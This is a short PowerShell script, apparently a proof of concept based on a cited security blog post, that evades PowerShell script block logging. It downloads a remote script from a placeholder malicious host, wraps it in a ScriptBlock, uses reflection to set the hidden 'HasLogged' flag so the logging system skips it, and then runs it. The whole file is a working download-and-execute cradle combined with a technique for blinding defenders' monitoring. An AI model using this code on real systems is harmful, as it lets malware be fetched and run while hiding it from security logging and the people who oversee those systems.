# technique from https://www.bc-security.org/post/powershell-logging-obfuscation-and-some-newish-bypasses-part-1/

# This script is not logged yet because its not executed
$script = (New-Object Net.WebClient).DownloadString('https://malicious.com/malware.ps1')
$scriptBlock = [ScriptBlock]::create($script)
# Set the HasLogged value to true, so that it's not "logged again"
[ScriptBlock].getproperty("HasLogged",@('nonpublic','instance')).setvalue($scriptBlock, $true)

# Invoke it, this will not get logged
$scriptBlock.invoke()
